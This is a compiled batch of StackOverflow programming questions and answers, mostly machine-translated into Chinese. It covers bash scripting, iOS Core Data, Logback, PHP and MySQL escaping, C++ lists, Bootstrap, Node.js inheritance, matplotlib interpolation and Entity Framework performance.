# StackOverflow 问答 13167000-13167999

# bash - $INPUT 不明确的重定向

> ID：13167000
> 
> 赞同：1
> 
> 时间：2012-10-31T20:32:17.003
> 
> 标签：bash, shell, cygwin

我前段时间写了这个脚本，它运行良好，但由于某种原因，我现在在 cygwin 的第 11 行收到“不明确的重定向”错误消息。

```
#!/bin/bash
cd 'my/file/path'
INPUT= ./Students.csv
OLDIFS=$IFS
IFS=,
[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
while read flname
do
    cp Rubric.pdf ./Grades/$flname_rubric.PDF

done < $INPUT
IFS=$OLDIFS 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T20:56:01.053

如前所述，删除空格。所以行读`INPUT=./Students.csv`

将 $INPUT 包装在 "" 中，以便读取`done < "$INPUT"`

我添加了`echo "cp Rubric.pdf ./Grades/$flname_rubric.PDF"`这样你就可以看到 while 循环在工作。

```
#!/bin/bash
INPUT=./Students.csv
OLDIFS=$IFS
IFS=,
[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
echo "While "
while read flname
do
    echo "cp Rubric.pdf ./Grades/$flname_rubric.PDF"
    cp Rubric.pdf ./Grades/$flname_rubric.PDF
done < "$INPUT"
IFS=$OLDIFS 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T20:51:55.940

尝试删除等号后的空格`INPUT=`。

# objective-c - 当数据不是静态的时，我应该如何保存大量数据。iOS、可可触控、Obj-C

> ID：13167005
> 
> 赞同：2
> 
> 时间：2012-10-31T20:32:26.753
> 
> 标签：objective-c, ios, database, cocoa-touch

好吧，我真的不知道如何在我的 iOS 应用程序上保存一堆数据。该应用程序将允许用户创建一个条目，该条目将具有其名称的时间戳。对于每个条目，我需要存储多种数据（NSString、Boolean、Double、Float）。

每个条目都必须保存如下信息：

/////////

漂浮

漂浮

漂浮

漂浮

漂浮

NSString

NSString

NSString

NSString

NSString

布尔值

布尔值

布尔值

//////////

因此，每个条目总共有 13 个值。但是，条目的数量可以无限地创建，并且会不断变化。因此，我应该如何存储所有这些信息。我对此很陌生，到目前为止，我所使用的只是`NSUserDefaults`. 谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T20:45:35.783

有了很多入口对象，Core Data 看起来很适合这个。在处理数据密集型应用程序时，它也是您工具带中的一个很好的框架。您基本上绘制出数据模型，然后将模型导出到可以查询的自定义对象（很像数据库）。

Lynda.com 上有一个很棒的教学系列，但你可以在这里找到来自 Apple 的很好的参考：

[https://developer.apple.com/library/ios/#documentation/DataManagement/Conceptual/iPhoneCoreData01/Introduction/Introduction.html](https://developer.apple.com/library/ios/#documentation/DataManagement/Conceptual/iPhoneCoreData01/Introduction/Introduction.html)

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T20:38:02.730

由于它们的顺序或类型非常动态，因此您可以只使用一个集合类（例如`NSDictionary`or `NSArray`）来保存数据的 objc 对象表示。这些类型采用`NSCoding`-- 只要它们的元素/内容也`NSCoding`兼容（例如`NSNumber`，，`NSString`或`NSNumber`（`CFBoolean`对于布尔值）），您就可以开始了。

`NSKeyedArchiver`当您的字段/类型不变时，这是一个不错的选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T20:43:24.673

使用核心数据。它非常灵活，为将数据从一种模式迁移到另一种模式提供了出色的解决方案，并且与 iCloud 紧密集成。从这里开始：

[核心数据入门](http://developer.apple.com/library/mac/#referencelibrary/GettingStarted/GettingStartedWithCoreData/_index.html#//apple_ref/doc/uid/TP40005316)

# eclipse - 如何让 Logback 在 Eclipse 控制台中以红色记录标准错误？

> ID：13167007
> 
> 赞同：4
> 
> 时间：2012-10-31T20:32:35.340
> 
> 标签：eclipse, logback

我曾经有一个博客链接，该链接展示了如何在 logback.xml 文件中配置 Logback，以便警告和严重级别显示为红色，而其他级别在 Eclipse 控制台中显示为黑色。

由于一些公司防火墙问题，我现在似乎无法访问 Google（Bing 似乎正在工作）。任何人都有如何做到这一点的链接？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:20:26.083

您必须配置 logback 以记录到 stderr。Eclipse 将以红色显示这些行。

但我强烈建议您使用[Grep 控制台插件](http://marketplace.eclipse.org/content/grep-console)：

> Grep Console 允许您定义一系列将针对控制台输出进行测试的正则表达式。每个匹配行的表达式都会影响整行或部分行的样式。例如，可以将错误消息设置为以红色背景显示，或者可以将显示某个变量状态的整数值设置为粗体。

这个插件的优点是你可以用不同的颜色突出显示不同的日志级别。我还突出显示堆栈跟踪中属于我的类的行。这使得在堆栈跟踪中查找相关行变得更加容易。

![截屏](../Images/ab0dc6fc849dc834178b5362fe5cc937.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T22:11:38.940

您是否看过[相关的 logback 文档](http://logback.qos.ch/manual/layouts.html#coloring)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-01T14:50:16.983

克里斯托弗的回答让我在那里......找到了我正在寻找的东西......

[如何配置 Logback 以将记录器的不同级别记录到不同的目的地？](https://stackoverflow.com/questions/5653062/how-can-i-configure-logback-to-log-different-levels-for-a-logger-to-different-de)

所以任何加入团队的开发人员都不需要 eclipse 插件，而且效果很好！！！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-10T03:51:25.697

您可能还想查看 Beagle： http: [//logback.qos.ch/beagle/](http://logback.qos.ch/beagle/)

# php - 使用 PHP 从文本文件中打印给定数量的行

> ID：13167008
> 
> 赞同：0
> 
> 时间：2012-10-31T20:32:35.217
> 
> 标签：php, file-io, text-files, user-input

我有一个最多 10 行的小型文本文件，其中包含用户最喜欢的 10 首歌曲。我有一个表单，允许用户输入数字 1-10 并显示文件中排名靠前的“X”歌曲。如何打印出用户给出 X 编号的文件的前“X”行？

这是我当前的脚本：

```
//if topSongs field is NOT empty
if(!empty($_POST['topSongs'])) {

    $showSongs = $_POST['topSongs'];

    if($showSongs <= 10) {

        $allTunes = file_get_contents($tunesFile);

        $tunesArray = explode("\n", $allTunes);

        foreach($tunesArray as $tune) {

            print($tune);

        }

    //if user input IS greater than 10
    } else {

        print(" <strong>A maximum of 10 songs are allowed</strong>");
    }

//if topSongs field IS empty
} else {                                
    print(" <strong>Please enter the number of songs to show</strong>");                        
} 
```

`$showSongs`变量保存给定的数字以显示

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T20:34:13.407

将 foreach 更改为以下内容：

```
for($i = 0; $i < $showSongs; $i++) {
    print($tunesArray[$i]);
} 
```

# php - Avoid Mysql quotes - also at SELECT query?

> ID：13167009
> 
> 赞同：-2
> 
> 时间：2012-10-31T20:32:40.520
> 
> 标签：php, mysql

```
$sql="SELECT `name` FROM $table "; 
```

what happens if into the records from `name` column there are quotes (') ? I need to change that SELECT query? And how? I noticed that Mysql reports an error like this:

1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'activation)'' at line 3

'cause 'activation is not good... but well...why can i read and manipulate the string variable if it returns an error? I saw exemples that use a WHERE condition...but I don't need that, I have to select all the records from the `name` column... please help

edit:

```
//..connection to database part, then...

    $sql="SELECT `name` FROM $table ";
    $res=mysql_query($sql);

    $c=0;
    function contains($str, array $arr)
    {
        foreach($arr as $a) {
            if (stripos($str,$a) !== false) return true;
        }
        return false;
    }
    $arr = array("à","â","æ","ç","è","é","ê","ë","î","ï","ô","œ","ù","û","ü","¡","¿","ñ","í","ó","ú","ä","ö","ß","ÿ");
    while ($row = mysql_fetch_row($res)) {
        $contiene = 0;
        $link=strtolower($row[0]);
        $link = iconv('Windows-1252', 'UTF-8//TRANSLIT//IGNORE', $link);
        $link= utf8_decode($link);
        $link = stripslashes($link);
        $link = mysql_real_escape_string($link);
        if (contains($link, $arr)) {
            echo "String containing special char\n";
            echo "$link\n";         
            $link = str_replace("à", "a", $link);
            $link = str_replace("â", "a", $link);
            $link = str_replace("æ", "ae", $link);
            $link = str_replace("ç", "c", $link);
            $link = str_replace("è", "e", $link);
            $link = str_replace("é", "e", $link);
            $link = str_replace("ê", "e", $link);
            $link = str_replace("ë", "e", $link);
            $link = str_replace("î", "i", $link);
            $link = str_replace("ï", "i", $link);
            $link = str_replace("ô", "o", $link);
            $link = str_replace("œ", "oe", $link);
            $link = str_replace("ù", "u", $link);
            $link = str_replace("û", "u", $link);
            $link = str_replace("ü", "ue", $link);
            $link = str_replace("¡", "-", $link);
            $link = str_replace("¿", "-", $link);
            $link = str_replace("ñ", "n", $link);
            $link = str_replace("í", "i", $link);
            $link = str_replace("ó", "o", $link);
            $link = str_replace("ú", "u", $link);
            $link = str_replace("ä", "ae", $link);
            $link = str_replace("ö", "oe", $link);
            $link = str_replace("ß", "ss", $link);
            $link = str_replace("ÿ", "y", $link);
            echo "String with replaced char\n";
            echo "$link\n";
            $c++;
            $contiene = 1;
        }
        $link=ereg_replace("[^a-z0-9\-]", "-", $link);
        echo "String after ereplace:\n";        
        echo "$link\n"; 
        if ($contiene ==1){
            $l="UPDATE $table 
                SET link_rewrite='$link'
                WHERE $table.name = '$row[0]'   "; 
            $r=mysql_query($l);
            if (!$r) {
            echo mysql_errno() . ": " . mysql_error() . "\n";
            }
        }

    }

    echo "Update catlink_rewrite( $c )";

?> 
```

what's wrong?

**String containing the accent or special char**:

acer aspire one d270-n261g326ck noir + housse néoprène noir & rouge avec pochette frontale lneo-10 - jusqu'à 10,2"

**String after str_replace**:

acer aspire one d270-n261g326ck noir + housse neoprene noir & rouge avec pochette frontale lneo-10 - jusqu'a 10,2"

**String after ereg_replace**:

acer-aspire-one-d270-n261g326ck-noir---housse-neoprene-noir---rouge-avec-pochette-frontale-lneo-10---jusqu-a-10-2-

**Mysql error**:

1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'à 10,2"'' at line 3

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T20:39:45.010

```
$row[0] = mysql_real_escape_string($row[0]); 
```

Do this before the `UPDATE query` where the `$row[0]` is used. You are not escaping anything. Your code makes my eyes bleed... and is very unsafe.

# c++ - 从 C++ 中的列表中删除项目

> ID：13167011
> 
> 赞同：3
> 
> 时间：2012-10-31T20:32:57.440
> 
> 标签：c++, list

我有这个程序，我想在列表中插入和删除项目。我的删除功能有问题。我希望用户告诉我他们想在列表中删除哪个索引，然后减小列表的大小，然后将这些项目一起移动。例如：333 222 111 如果我删除第二个数字，那么列表看起来像 333 111 并且列表的大小将减少到 2。

提前致谢！

```
/*  insert
 *  parameters:
 *    index  -- the place in the list to insert newItem
 *    newItem -- the item to insert into the list
 *  returns:
 *    true -- if the item is successfully inserted
 *    false -- otherwise
 *  precondition:  0 < index
 *  postcondition:  newItem is in postiion "index" of the list
 *  Algorithm:  stuff
 */

bool myList::insert(int index, ListItemType newItem) {
    if (!(index > 0)) {
        cerr << "insert:  precondition failed with index = " << index << endl;
        return false;
    }

    if (size == MAX_LIST) {
        cout << "List is full" << endl;
        return false;
    }

    if (index > size) {
        items[size] = newItem;
        size++;
        return true;
    }

    //list is not full and index is b/w items 1 and size-1
    for (int i = size; i >= index; i--) {
        items[i] = items[i - 1];

    }

    items[index - 1] = newItem;
    size++;

    return true;
}

bool myList::remove(int index) {
    //I tried this but it doesn't work well enough
    if (!(index > 0)) {
        cerr << "insert:  precondition failed with index = " << index << endl;
        return false;
    }

    for (int i = size; i >= 0; i--) {
        items[index] = items[index + 1];

    }

    size--;
    return true;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T20:38:35.350

就像其他人说的，你应该尝试使用 stl。但是使用到目前为止的代码。你应该改变你*的*for 是这样的：

```
for (int i = index; i < size - 1; i++)
{
    items[i] = items[i+1];

} 
```

这样做的目的是，从删除的项目开始，将每个项目替换为后面的项目。这就像向左移动一样。

这不会破坏任何元素，但我猜我们可以放手。

# mercurial - 如何防止强制构建新构建的标签

> ID：13167013
> 
> 赞同：0
> 
> 时间：2012-10-31T20:33:06.417
> 
> 标签：mercurial, teamcity

> **可能重复：**
> [如何为忽略标签操作的 TeamCity 设置 Mercurial VCS 构建触发器](https://stackoverflow.com/questions/1478297/how-to-set-a-mercurial-vcs-build-trigger-for-teamcity-that-ignores-label-operati)

我的 TeamCity 项目使用 Mercurial VCS 并在构建成功时标记代码。

问题在于，将标签注册为更改并触发另一个构建的行为。

如何设置 TeamCity 以放置标签，但不仅从该标签触发构建？我对 TC 和 Hg 相当陌生，所以我可能缺少一个关键配置值。

# objective-c - 擦除源时将数据临时存储在数组中

> ID：13167014
> 
> 赞同：1
> 
> 时间：2012-10-31T20:33:09.500
> 
> 标签：objective-c, ios, arrays, cocoa-touch, core-data

我们正在使用 Core Data 在我们的 iOS 应用程序上本地存储信息。当我们远程更新信息时，应用程序会删除核心数据中的本地数据，并替换为新的。这就是我们设计它的方式，而且效果很好。但是，现在我们需要保留一些数据。我们已经包含了一些用户可编辑的字段，并且需要其中一个实体来拥有一些旧信息。我尝试对整个实体进行获取请求，将它们存储在一个数组中，然后删除该实体，然后更新为新数据，然后从存储的数组中推送旧数据。但是，当我清除核心数据时，数组上的所有数据都会被擦除。我们尝试过使用 NSArray、NSMutableArray 并使用 initWithArray:a copyItems:YES 进行初始化。我们如何将信息存储在数组中，然后删除资源？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-29T05:23:37.960

使用 NSUserDefaults 保存数组中的数据

```
[[NSUserDefaults standardUserDefaults] setObject:<#(id)#> forKey:<#(NSString *)#>]; 
```

使用拉取数据

```
NSString *myString = [[NSUserDefaults standardUserDefaults] objectForKey:<#(NSString *)#>]; 
```

# asp.net - 在asp.net中从一个表到另一个表中获取数据

> ID：13167018
> 
> 赞同：1
> 
> 时间：2012-10-31T20:33:24.913
> 
> 标签：asp.net, sql-server

我有两个表，称为注册和用户。

登记表：

```
PID(primary key,autoincrement)
email
password
name
etc 
```

用户：

```
UserID
Address
etc 
```

如果有人注册，则数据将存储在注册表中。

现在，如果我想在用户表中插入数据，那么如何为刚刚注册的那个特定人插入数据？

例如：注册表

```
PID  email        name
1    abc@ab.com   xyz 
```

我想将数据插入到用户表中`PID=1`

登录后（通过电子邮件和密码完成）只有人可以在 USER 表中插入数据。

对此有什么查询？

我应该在表中添加一些常见的列`User`吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T04:59:49.497

只需在表注册表上创建触发器。这样当有人注册时，它也会自动将数据插入到用户表中。

在注册表中触发后写入插入。

查看此链接，例如：

[http://www.dotnet-tricks.com/Tutorial/sqlserver/OPUH170312-After-Trigger,-Instead-of-Trigger-Example.html](http://www.dotnet-tricks.com/Tutorial/sqlserver/OPUH170312-After-Trigger,-Instead-of-Trigger-Example.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T22:16:47.367

向用户表添加新列：

PId - 它应该是注册表中 Pid 列的外键。在此处阅读有关外键的信息：

[http://www.w3schools.com/sql/sql_foreignkey.asp](http://www.w3schools.com/sql/sql_foreignkey.asp)

插入用户表的查询应该是：

```
Insert into Users(pid,email,name) values(1,'abc@ab.com','xyz') 
```

也许您想检查是否没有具有已注册凭据的此类用户？所以也许先尝试选择这样的用户，只有在没有用户的情况下才插入，所以要检查，你应该首先添加：

```
If Not exists(select 1 from Registration where pid = 1) 
```

登录时获取数据的查询应该是：

```
Select * from users join registration on users.pid = registration.pid
Where registration.username = 'given user name' 
```

或者，不是用户名，而是通过两个表中的任何一个中的任何其他列进行比较。您可以这样做，因为您将两个表连接到一个表中。

在此处阅读有关加入的信息：

[http://msdn.microsoft.com/en-us/library/ms191517(v=sql.105).aspx](http://msdn.microsoft.com/en-us/library/ms191517(v=sql.105).aspx)

# html - 使用 Twitter Bootstrap 标题下拉菜单

> ID：13167021
> 
> 赞同：0
> 
> 时间：2012-10-31T20:33:39.250
> 
> 标签：html, css, twitter-bootstrap, responsive-design

我使用 Twitter Bootstrap 设计了一个完整的网站，它在大多数情况下都运行良好。我过去做过很多 CSS，但从来没有做过这样的框架。

我遇到的主要问题是，当浏览器低于 600 像素并且标题压缩成一个下拉列表（我想要的）时，下拉列表位于图像和一些 HTML 元素（如文本输入框和其他下拉菜单）后面。

有没有办法使这个标题下拉菜单不透明，以便它位于所有其他元素的前面？我会提供一些代码，但我不确定 Twitter Bootstrap 样式表的哪一部分会有所帮助。

```
<div class="navbar navbar-fixed-top">

              <div class="navbar-inner">

                  <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">

                    <span class="icon-bar"></span>

                    <span class="icon-bar"></span>

                    <span class="icon-bar"></span>

                  </a>

                  <a class="brand" href="/">Exployre</a>

                  <div class="nav-collapse">

                    <ul class="nav">

                      <li><a href="/map">Find</a></li>

                      <li><a href="/shareadventure">Share</a></li>

                      <li><a href="/home">Inspire</a></li>

                      <li><a href="/posts">Discuss</a></li>

                      <li><a href="/groups">Groups</a></li>

                      <li><a href="/profile">Profile</a></li>

                      <li><a href="/about">About</a></li>

                  <li>        

                        <form action="/search" class="navbar-search">

                          <div>

                            <input type="text" placeholder="Search" class="search-query pull-right" name="q" size="55" />

                          </div>

                        </form>

                        <script type="text/javascript" src="http://www.google.com/coop/cse/brand?form=cse-search-box&amp;lang=en"></script>

                      </li>

                    </ul>

                  </div><!--/.nav-collapse -->

              </div>

            </div> 
```

我相信所有这些类都直接来自 Twitter Bootstrap CSS，无需修改。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T20:41:40.403

您的网站内容上的 z-index 值可能高于为下拉菜单定义的 z-index 值。

如果您使用的是 LESS 版本的 Twitter Bootstrap，请打开 variables.less 并找到包含的行`@zindexDropdown`（在[第 144 行](https://github.com/twitter/bootstrap/blob/master/less/variables.less#L144)）。默认设置为 1000，您可以将其更改为高于内容 z-index 的数字。

如果您使用的是普通 CSS，它在规则中定义`.dropdown-menu`（在[第 2773 行](https://github.com/twitter/bootstrap/blob/master/docs/assets/css/bootstrap.css#L2773)）。

# node.js - node.js 很好的继承方式

> ID：13167024
> 
> 赞同：0
> 
> 时间：2012-10-31T20:33:51.067
> 
> 标签：node.js, inheritance, prototype, commonjs

这被认为是好的代码，有没有更清洁/更好的方法？所以子类对如何从存储机制中实际获取数据一无所知。只是能够使用这些方法来组合功能。

base.js

```
function Base() {}

Base.prototype.getInternal = function(id, cb) {}

module.exports = Base; 
```

child.js

```
function Child() {}
util.inherits(Child, Base);

Child.prototype.get = function(id, cb) {
  this.getInternal(id, cb);
}

module.exports = new Child(); 
```

测试.js

```
var Child = require('child');
Child.get('id', function(err, result) {
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T02:28:01.163

代码看起来不错。我喜欢 Node.js 的这种继承方法，但是您也可以查看一段代码，例如[John Resig 的简单继承端口](http://ejohn.org/blog/simple-javascript-inheritance/)。

至于寻找封装存储方法的最佳方法，您可以在传递存储方法的地方使用依赖注入。这是一篇关于它的不错的文章。[http://merrickchristensen.com/articles/javascript-dependency-injection.html](http://merrickchristensen.com/articles/javascript-dependency-injection.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-24T21:16:24.413

您成功地应用了原型继承。没什么好说的了。但是，还有另一种方法称为功能继承。[Julien Richard-Foy](http://julien.richard-foy.fr/blog/2011/10/30/functional-inheritance-vs-prototypal-inheritance/)令人信服地认为功能继承可能更可取。

在 Java 这样的基于类的语言中，您肯定会广泛使用继承。然而，在基于原型的语言 JavaScript 中，广泛使用继承并不常见。（可能是因为很多人不理解原型的概念，或者可能是因为 JavaScript 缺少太多你期望从面向对象语言中获得的附加功能。我不能说。）而不是使用语言特性 JavaScript 开发人员经常求助于适配器、装饰器和代理等设计模式。

一种非常重要的设计模式是依赖注入。正如 Charlie Key 已经说过的那样，在您的情况下，这种模式可能是继承的更好选择。如果您想研究在 node.js 中使用依赖注入，请阅读这篇[出色的文章](http://www.mariocasciaro.me/dependency-injection-in-node-js-and-other-architectural-patterns)或查看[Fire Up！](https://github.com/analog-nico/fire-up)- 我实现的依赖注入器。

# android - 将代码从 Android 的 MainActivity 类移动到它们自己的库或文件中

> ID：13167033
> 
> 赞同：3
> 
> 时间：2012-10-31T20:34:21.037
> 
> 标签：android, android-library

我是 Java 和 Android 开发的新手，但我已经能够创建一堆函数、子类和常量，当粘贴到`MainActivity`默认 Android 项目的类中时它们工作得非常好。

这些功能的目的是“ping home”，让我的服务器知道何时发生了应用程序安装。实现这一点所需的唯一代码是`notifyMyServer()`此标准代码块内的行`MainActivity.java`：

```
public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        notifyMyServer("install"); /* Notify MyServer of an Installation */

    }
} 
```

`notifyMyServer()`粘贴直接在文件中工作的函数、子类、常量和导入`MainActivity.java`对我来说似乎很脏。我希望能够将它们移动到他们自己的文件和/或库中，这样我就可以将该文件拖放到我想要执行相同跟踪的其他应用程序中。

**这通常是如何完成的？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T22:09:06.187

至少有两种方法可以解决这个问题：

1）创建一个`NotifyActivity`可以扩展的类`MainActivity`，如[@Tim's answer](https://stackoverflow.com/questions/13167033/moving-code-from-androids-mainactivity-class-to-their-own-library-or-file/13168030#13168030)中所述。这使用继承。

2) 创建一个`NotifyServer`类并在 中创建它的实例`MainActivity`，作为类变量或作为 中的局部变量`onCreate()`。这使用组合。

通常在面向对象设计中，组合优于继承。我强烈建议您学习这两个概念，因为您将在 Java 编程中反复使用它们。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:56:05.923

获取您的通知代码并创建一个仅执行此通知的类（可以是库的一部分，也可以不是）：

```
public class NotifyingActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        notifyMyServer("install"); /* Notify MyServer of an Installation */
    }
} 
```

然后在您的 MainActivity 中，只需继承自`NotifyingActivity`而不是`Activity`. 然后，当您在 MainActivity 中调用 super.onCreate() 时，通知将自动发生。

# iphone - 如何根据gps坐标为地图上的区域着色

> ID：13167036
> 
> 赞同：0
> 
> 时间：2012-10-31T20:34:38.417
> 
> 标签：iphone, objective-c, ios

我正在尝试在具有多个 GPS 坐标的地图上绘制和区域。这些坐标将从网络服务下载。在彩色区域块上创建了五个坐标。因为我还不能发布图片，这里是示例 [OutageMap的 url](http://azimuth.mlgw.org/OutageSummary.php)

有人能告诉我实现这一目标的最佳方法是什么吗？我在这里在黑暗中拍摄，所以没有真正的代码可用。下面的 url 是我们目前通过 html 使用的。尝试在 iphone 上本地创建它，而不是调用 webview。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T20:57:00.523

您可以将 a`MKPolygon`和 a`MKPolygonView`与您的点列表一起使用：

创建 viewController 或加载数据时，`MKPolygon`为地图中的每个彩色块添加一个：

```
- (void)viewDidLoad {
    for (NSDictionary *coloredAreas in coloredAreas) {
        NSArray *coordinateData = coloredArea[@"coords"];
        // this assumes coordinateData is an array of arrays like:
        // [[0, 0], [0, 1], [0, 1]]
        NSUInteger coordsLen = [coordinateData count];
        CLLocationCoordinate2D *coords = malloc(sizeof(CLLocationCoordinate2D) * coordsLen);
        for (int i=0; i < coordsLen; i++) {
            coords[i] = CLLocationCoordinate2DMake(coordinateData[i][0], coordinateData[i][1]);
        }
        MKMapPoint point[] = coloredAreas['points'];
        MKPolygon *polygon = [MKPolygon polygonWithPoints:points count:3];
        [self.mapView addOverlay:polygon];
    }
} 
```

然后添加一个`mapView:viewForOverlay`方法来绘制每个多边形：

```
- (MKOverlayView *)mapView:(MKMapView *)mapView viewForOverlay:(id <MKOverlay>)overlay {
    MKPolygonView *polygonView = [[MKPolygonView alloc] initWithPolygon:overlay]]; 
    polygonView.fillColor = [UIColor greenColor];
    return polygonView;
} 
```

这将为每个多边形绘制一个绿色框。为了使每个多边形都具有某种颜色，我将创建一个`ColoredPolygon`类，该类是其子类`MKPolygon`并且具有`color`属性。`ColoredPolygon`然后在加载数据时创建并设置颜色。在`mapView:viewForOverlay`您只需将`MKOverlay`a 转换为 a`ColoredPolygon`然后将其设置`fillColor`为`ColoredPolygon.color`。

# matplotlib - 单向插值

> ID：13167040
> 
> 赞同：3
> 
> 时间：2012-10-31T20:34:53.757
> 
> 标签：matplotlib

我已经对数据进行了采样并将其绘制为`imshow()`：

![在此处输入图像描述](../Images/4656b5618202ecfae8a6239761b014f6.png)

我想在水平轴上进行插值，以便更容易区分样本和点特征。是否可以使用 MPL 仅在一个方向上进行插值？

* * *

**更新**：
SciPy 具有各种插值方法的完整包。根据 tcaswell的建议，我使用了最简单的*interp1d*：

```
def smooth_inter_fun(r):
    s = interpolate.interp1d(arange(len(r)), r)
    xnew = arange(0, len(r)-1, .1)
    return s(xnew)

new_data = np.vstack([smooth_inter_fun(r) for r in data]) 
```

线性和三次结果：

![在此处输入图像描述](../Images/cb2ebad915b5c1da338afa69d3908074.png)

![在此处输入图像描述](../Images/5197659133ccf7380f28b9ce29b2a00d.png)

正如预期的那样:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T22:29:28.127

本[教程](http://docs.scipy.org/doc/scipy/reference/tutorial/interpolate.html)涵盖了 numpy/scipy 中可用的一系列插值。如果你只想一个方向，我会独立处理每一行，然后重新组合结果。您可能还对简单地平滑数据感兴趣（例如，[Python 平滑时间序列数据](https://stackoverflow.com/questions/5515720/python-smooth-time-series-data)，使用[strides](http://argandgahandapandpa.wordpress.com/2011/02/24/python-numpy-moving-average-for-data/)[进行有效的移动平均过滤器](https://stackoverflow.com/questions/4936620/using-strides-for-an-efficient-moving-average-filter)）。

```
def smooth_inter_fun(r):
    #what ever process you want to use
new_data = np.vstack([smooth_inter_fun(r) for r in data]) 
```

# sql - 为什么 EF5 的审核注销事件需要 EF5 大约 3 秒？

> ID：13167048
> 
> 赞同：0
> 
> 时间：2012-10-31T20:35:22.120
> 
> 标签：sql, entity-framework, .net-4.5

我正在尝试将我们的本土 ORM 解决方案更改为 EntityFramework 5 的概念教授放在一起，而我遇到的第一个问题似乎是一个严重的阻碍。

EF5 出现，我们的盒子，执行标量 sql 操作的时间比 ad hock sql 长约 9 倍，但是当我查看生成的 sql 代码时，sql 本身似乎写得很好，并且运行得很快。

我的 C# 代码：

```
 int surveyId = (from survey in upsEntities.Surveys where !survey.Deleted select survey.SurveyID).First();
            Debug.WriteLine("Loading surveyId : {0} through Linq took {1}ms using EF5", surveyId,
                            sw.Elapsed.TotalMilliseconds);

            sw.Restart();

            string sql = "Select top 1 surveyId from Survey where deleted = 0";
            object val = SMSDataManager.Instance.DataAccessManager.ExecuteScalar(sql);

            Debug.WriteLine("Loading surveyId : {0} through AdHock SQL took {1}ms using OrmDataManager", val,
                           sw.Elapsed.TotalMilliseconds); 
```

SQL 输出：EF5：

```
SELECT TOP (1) 
[Extent1].[SurveyID] AS [SurveyID]
FROM [dbo].[Survey] AS [Extent1]
WHERE [Extent1].[Deleted] <> cast(1 as bit) 
```

临时工：`Select top 1 surveyId from Survey where deleted = 0`

> **使用 EF5**通过 Linq 加载surveyId：1 花费了2965.8625ms
> 
>  **通过 AdHock SQL 加载surveyId : 1**耗时 384.8073ms****

 **根据分析器，两者之间的持续时间对于 EF5 是 1 毫秒，而对于 ad hoc 是 0 毫秒。问题似乎出在**EF5的****审核注销**事件中，大约需要 3 秒，而我的**ad hoc sql**对于相同的注销事件需要大约 0.6 秒。

 ****是什么导致了 EF5 的巨大开销，我可以做些什么来减轻或解释这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T13:49:36.623

每个应用程序域只进行一次初始化。根据模型的复杂程度以及第一次连接到数据库需要多长时间，它可能需要一点时间。您可以在我的博客上查看此评论，该评论简要讨论了[Visual Studio 代码库上的初始化实体框架代码优先视图生成模板 - 评论 #249](http://blog.3d-logic.com/2012/06/13/entity-framework-codefirst-view-generation-templates-on-visual-studio-code-gallery/#comment-249)。还有这个页面：[Entity Framework 5 的性能注意事项](http://msdn.microsoft.com/en-us/data/hh949853.aspx)是您可能想要查看的内容。******

# ios - 知道 GCD 线程是否正在运行

> ID：13167049
> 
> 赞同：0
> 
> 时间：2012-10-31T20:35:22.743
> 
> 标签：ios, multithreading, grand-central-dispatch

在我的 iOS 应用程序中，我在后台线程中下载了大量数据。我需要做的是以某种方式检查用户何时重新打开应用程序，如果此任务仍在运行或已被取消。

例如，如果用户点击主页按钮，然后返回应用程序，线程将继续，这很好。但是，如果线程以某种方式被操作系统破坏了怎么办。我如何在应用程序简历上知道线程是否正在运行。

谢谢！

一些代码：

```
// Starts a background thread and also allows it to run in the background if the user exits app
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
    UIBackgroundTaskIdentifier bgTask = 0;
    bgTask = [[UIApplication sharedApplication] beginBackgroundTaskWithExpirationHandler:^{
        [self endBackgroundUpdateTask:bgTask];
    }];

// Code here to run in background

// Tell the main thread its done, and also remove itself from background execution
dispatch_async( dispatch_get_main_queue(), ^{
    NSLog(@"Done with background thread");
    [self endBackgroundUpdateTask:bgTask];
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T20:53:02.207

首先，当您的应用程序进入后台时，任何线程、前台或后台都将被挂起。当您过渡到后台以完成和清理时，您可以做一些事情来获得少量时间......但是当您的应用程序离开屏幕时，您肯定会关闭，“后台”线程与否。

这意味着您的下载将被暂停，您将不得不优雅地恢复并从中断的地方继续。为此，您应该研究 iOS 提供的技术，以便通知您进入后台并允许一些额外的时间来清理和保存一些可用于恢复的状态。

调查这个：

```
